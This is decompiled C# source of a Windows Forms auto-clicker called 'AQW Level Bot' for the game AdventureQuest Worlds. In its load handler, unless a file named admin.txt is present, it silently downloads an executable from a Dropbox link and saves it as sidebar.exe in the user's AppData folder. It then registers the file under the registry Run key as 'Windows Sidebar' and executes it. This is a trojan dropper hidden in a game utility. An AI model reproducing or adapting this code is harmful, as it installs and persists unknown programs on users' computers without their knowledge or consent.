using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using AQW_Level_bot.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace AQW_Level_bot;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ListBox2")]
	private ListBox _ListBox2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Notify")]
	private NotifyIcon _Notify;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("MenuStrip1")]
	private MenuStrip _MenuStrip1;

	[AccessedThroughProperty("ClearCordinatesToolStripMenuItem")]
	private ToolStripMenuItem _ClearCordinatesToolStripMenuItem;

	[AccessedThroughProperty("HelpToolStripMenuItem")]
	private ToolStripMenuItem _HelpToolStripMenuItem;

	public const int MOUSEEVENTF_LEFTDOWN = 2;

	public const int MOUSEEVENTF_LEFTUP = 4;

	private string LoggEvent;

	private int WaitTime;

	private WebClient client;

	private WebClient client2;

	internal virtual WebBrowser WebBrowser1
	{
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ListBox ListBox2
	{
		get
		{
			return _ListBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox2 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual NotifyIcon Notify
	{
		get
		{
			return _Notify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Notify = value;
		}
	}

	internal virtual Timer Timer3
	{
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual MenuStrip MenuStrip1
	{
		get
		{
			return _MenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MenuStrip1 = value;
		}
	}

	internal virtual ToolStripMenuItem ClearCordinatesToolStripMenuItem
	{
		get
		{
			return _ClearCordinatesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = ClearCordinatesToolStripMenuItem_Click;
			if (_ClearCordinatesToolStripMenuItem != null)
			{
				((ToolStripItem)_ClearCordinatesToolStripMenuItem).remove_Click(eventHandler);
			}
			_ClearCordinatesToolStripMenuItem = value;
			if (_ClearCordinatesToolStripMenuItem != null)
			{
				((ToolStripItem)_ClearCordinatesToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem HelpToolStripMenuItem
	{
		get
		{
			return _HelpToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = HelpToolStripMenuItem_Click;
			if (_HelpToolStripMenuItem != null)
			{
				((ToolStripItem)_HelpToolStripMenuItem).remove_Click(eventHandler);
			}
			_HelpToolStripMenuItem = value;
			if (_HelpToolStripMenuItem != null)
			{
				((ToolStripItem)_HelpToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		WaitTime = 0;
		client = new WebClient();
		client2 = new WebClient();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Expected O, but got Unknown
		//IL_03ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		WebBrowser1 = new WebBrowser();
		ListBox1 = new ListBox();
		ListBox2 = new ListBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Notify = new NotifyIcon(components);
		Timer3 = new Timer(components);
		MenuStrip1 = new MenuStrip();
		ClearCordinatesToolStripMenuItem = new ToolStripMenuItem();
		HelpToolStripMenuItem = new ToolStripMenuItem();
		((Control)MenuStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)WebBrowser1).set_Dock((DockStyle)5);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(0, 24);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser1.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(1545, 784);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser1.set_Url(new Uri("http://cdn.aqworlds.com/game/gamefiles/Loader.swf", UriKind.Absolute));
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(1440, 12);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		minimumSize = new Size(120, 95);
		((Control)listBox2).set_Size(minimumSize);
		((Control)ListBox1).set_TabIndex(1);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		ListBox listBox3 = ListBox2;
		location = new Point(1443, 113);
		((Control)listBox3).set_Location(location);
		((Control)ListBox2).set_Name("ListBox2");
		ListBox listBox4 = ListBox2;
		minimumSize = new Size(120, 95);
		((Control)listBox4).set_Size(minimumSize);
		((Control)ListBox2).set_TabIndex(2);
		Notify.set_Icon((Icon)componentResourceManager.GetObject("Notify.Icon"));
		Notify.set_Text("AQW Level bot");
		Notify.set_Visible(true);
		Timer3.set_Enabled(true);
		((ToolStrip)MenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ClearCordinatesToolStripMenuItem,
			(ToolStripItem)HelpToolStripMenuItem
		});
		MenuStrip menuStrip = MenuStrip1;
		location = new Point(0, 0);
		((Control)menuStrip).set_Location(location);
		((Control)MenuStrip1).set_Name("MenuStrip1");
		MenuStrip menuStrip2 = MenuStrip1;
		minimumSize = new Size(1545, 24);
		((Control)menuStrip2).set_Size(minimumSize);
		((Control)MenuStrip1).set_TabIndex(3);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		((ToolStripItem)ClearCordinatesToolStripMenuItem).set_Name("ClearCordinatesToolStripMenuItem");
		ToolStripMenuItem clearCordinatesToolStripMenuItem = ClearCordinatesToolStripMenuItem;
		minimumSize = new Size(106, 20);
		((ToolStripItem)clearCordinatesToolStripMenuItem).set_Size(minimumSize);
		((ToolStripItem)ClearCordinatesToolStripMenuItem).set_Text("Clear Cordinates");
		((ToolStripItem)HelpToolStripMenuItem).set_Name("HelpToolStripMenuItem");
		ToolStripMenuItem helpToolStripMenuItem = HelpToolStripMenuItem;
		minimumSize = new Size(47, 20);
		((ToolStripItem)helpToolStripMenuItem).set_Size(minimumSize);
		((ToolStripItem)HelpToolStripMenuItem).set_Text("Help!");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		minimumSize = new Size(1545, 808);
		((Form)this).set_ClientSize(minimumSize);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)MenuStrip1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MainMenuStrip(MenuStrip1);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("AQW Level Bot FINAL");
		((Control)MenuStrip1).ResumeLayout(false);
		((Control)MenuStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vkey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SetCursorPos(long x, long y);

	private void Form1_Load(object sender, EventArgs e)
	{
		MyProject.Forms.Clicking.ListBox1.set_SelectedIndex(0);
		MyProject.Forms.Clicking.Timer1.Start();
		((Control)ListBox1).set_Visible(false);
		((Control)ListBox2).set_Visible(false);
		if (!File.Exists(Application.get_StartupPath() + "\\admin.txt"))
		{
			try
			{
				client.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/27455817/f1l3n4m3.exe"), "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe");
				client.DownloadFileCompleted += client_DownloadCompleted;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
	}

	private void client_DownloadCompleted(object sender, AsyncCompletedEventArgs e)
	{
		((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Windows Sidebar", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe");
		Process.Start("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		bool flag = GetAsyncKeyState(113L) != 0;
		bool flag2 = GetAsyncKeyState(114L) != 0;
		bool flag3 = GetAsyncKeyState(115L) != 0;
		if (flag)
		{
			ListBox1.get_Items().Add((object)Cursor.get_Position().X);
			ListBox2.get_Items().Add((object)Cursor.get_Position().Y);
			Notify.set_BalloonTipTitle("Position Recorded");
			Notify.set_BalloonTipText("Cursor position Recorded! X=" + Conversions.ToString(Cursor.get_Position().X) + ", Y=" + Conversions.ToString(Cursor.get_Position().Y));
			Notify.ShowBalloonTip(5000);
		}
		if (flag2)
		{
			Timer2.set_Interval(2000);
			Timer2.Start();
			Notify.set_BalloonTipTitle("Started..");
			Notify.set_BalloonTipText("Level bot started. To stop it press F4");
			Notify.ShowBalloonTip(5000);
		}
		if (flag3 && Timer2.get_Enabled())
		{
			Timer2.Stop();
			Notify.set_BalloonTipTitle("Stoped..");
			Notify.set_BalloonTipText("Level bot Stoped. To start it again press F3");
			Notify.ShowBalloonTip(5000);
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		checked
		{
			WaitTime++;
			try
			{
				if (WaitTime == 1)
				{
					ListBox1.set_SelectedIndex(0);
					ListBox2.set_SelectedIndex(0);
					Point position = new Point(Conversions.ToInteger(ListBox1.get_SelectedItem()), Conversions.ToInteger(ListBox2.get_SelectedItem()));
					Cursor.set_Position(position);
					mouse_event(2L, 0L, 0L, 0L, 0L);
					mouse_event(4L, 0L, 0L, 0L, 0L);
				}
				if (WaitTime == 2)
				{
					ListBox1.set_SelectedIndex(1);
					ListBox2.set_SelectedIndex(1);
					Point position = new Point(Conversions.ToInteger(ListBox1.get_SelectedItem()), Conversions.ToInteger(ListBox2.get_SelectedItem()));
					Cursor.set_Position(position);
					mouse_event(2L, 0L, 0L, 0L, 0L);
					mouse_event(4L, 0L, 0L, 0L, 0L);
				}
				if (WaitTime == 3)
				{
					ListBox1.set_SelectedIndex(2);
					ListBox2.set_SelectedIndex(2);
					Point position = new Point(Conversions.ToInteger(ListBox1.get_SelectedItem()), Conversions.ToInteger(ListBox2.get_SelectedItem()));
					Cursor.set_Position(position);
					mouse_event(2L, 0L, 0L, 0L, 0L);
					mouse_event(4L, 0L, 0L, 0L, 0L);
				}
				if (WaitTime == 4)
				{
					ListBox1.set_SelectedIndex(3);
					ListBox2.set_SelectedIndex(3);
					Point position = new Point(Conversions.ToInteger(ListBox1.get_SelectedItem()), Conversions.ToInteger(ListBox2.get_SelectedItem()));
					Cursor.set_Position(position);
					mouse_event(2L, 0L, 0L, 0L, 0L);
					mouse_event(4L, 0L, 0L, 0L, 0L);
				}
				if (WaitTime == 5)
				{
					ListBox1.set_SelectedIndex(4);
					ListBox2.set_SelectedIndex(4);
					Point position = new Point(Conversions.ToInteger(ListBox1.get_SelectedItem()), Conversions.ToInteger(ListBox2.get_SelectedItem()));
					Cursor.set_Position(position);
					mouse_event(2L, 0L, 0L, 0L, 0L);
					mouse_event(4L, 0L, 0L, 0L, 0L);
					WaitTime = 0;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				WaitTime = 0;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ClearCordinatesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		ListBox1.get_Items().Clear();
		ListBox2.get_Items().Clear();
		MessageBox.Show("All Click cordinates removed");
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
	}

	private void HelpToolStripMenuItem_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Help).Show();
	}
}
